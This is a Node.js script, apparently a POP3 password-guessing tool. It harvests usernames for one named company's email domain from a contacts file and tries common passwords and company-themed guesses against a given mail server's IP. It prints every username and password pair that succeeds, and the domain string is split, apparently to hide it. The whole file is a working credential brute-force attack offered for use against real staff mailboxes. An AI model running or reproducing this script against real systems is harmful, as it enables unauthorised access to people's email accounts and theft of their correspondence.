// 信箱若口令测试
// node testPop3.js 125.171.203.220 110 /Users/`whoami`/Desktop/mytels.txt
var pp = require('./pop3'),fs = require('fs');

process.setMaxListeners(0);
require('events').EventEmitter.prototype._maxListeners = 0;
require('events').EventEmitter.defaultMaxListeners = 0

var args = process.argv.splice(2);
// var port = 110, host = args[0],"125.71.203.220";
var port = args[1], host = args[0],
	async = require('async'),
	s = args[2];

fs.exists(s,function(bC)
{
	if(bC)
	{
		fs.readFile(s, 'utf8', function (err, s1) 
	    {
	        if (err) throw err;
	        else
	        {
	        	var rg = /pref:([^@\r\n\s]+)@yinhai\.com/gmi, a;
	        	a = rg.exec(s1);
	        	var szHz = "@yinh" + "ai.c" + "om";
	        	var aDt = [];
	        	// console.log(a);
	        	var fnCT = function(oT)
        		{
	        		new pp(oT,function()
	        		{
	        			console.log([oT.username,oT.password]);
	        		});
        		};
        		var g_aUs = [];
	        	while(a = rg.exec(s1))
	        	{
	        		g_aUs.push(a[1]);
	        	}
	        	console.log( g_aUs.length + "个账号弱口令待验证");
				async.mapLimit(g_aUs,3,function(s,fnCbk)
				{
					fnCbk();
					(function(a){
						fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": a[1] + "!@#$"});
						fnCT({"port":port,"host":host,"username": a[1] + szHz,"password": a[1] + "!@#$1234"});
						//*//
						var aRp = "123456,password,123456789,12345678,111111,1234567,654321,qwerty,sunshine,000000,abc123,charlie,666666,123123,linked,maggie,1234567890,princess,michael".split(",");
						for(var x = 0; x < aRp.length; x++)
						{
		        			fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": aRp[x]});
		        		}
		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "123456789"});
		        		
		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai!@#$"});
		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai123"});
		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd2013!"});
		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd"});
		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "yhP@ssw0rd"});
	        		//*/
					})([,s]);
				});
	        }
	    });
	}
	else
	{
	    console.log(s + " 不存在");
	}
});